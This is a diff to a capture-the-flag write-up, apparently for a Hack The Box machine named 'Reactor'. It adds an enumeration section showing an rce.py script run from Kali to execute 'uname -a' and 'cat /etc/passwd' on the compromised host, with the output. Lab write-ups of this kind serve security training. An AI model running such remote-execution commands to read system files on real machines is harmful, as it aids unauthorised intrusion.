@@ -961,11 +961,25 @@ The application was running as `uid=999(node)` — a low-privilege service accou
 
 ##### 3.2.2 System and File Enumeration
 
+With execution context confirmed, further enumeration commands were run to map the target environment.
+
+**Command:** `python3 rce.py "uname -a"`
+
+**Breakdown:**
+
+- `uname -a`
+    - **Description:** Full system information command
+    - **Purpose:** Reveals the kernel version, architecture, and OS — critical for identifying potential kernel exploits and understanding the target environment.
+
+**Result:**
+
 ```shell
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
 └─$ python3 rce.py "uname -a"
 Linux reactor 6.8.0-117-generic #117-Ubuntu SMP PREEMPT_DYNAMIC Tue May  5 19:26:24 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
+```
 
+```
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
 └─$ python3 rce.py "cat /etc/passwd"
 root:x:0:0:root:/root:/bin/bash
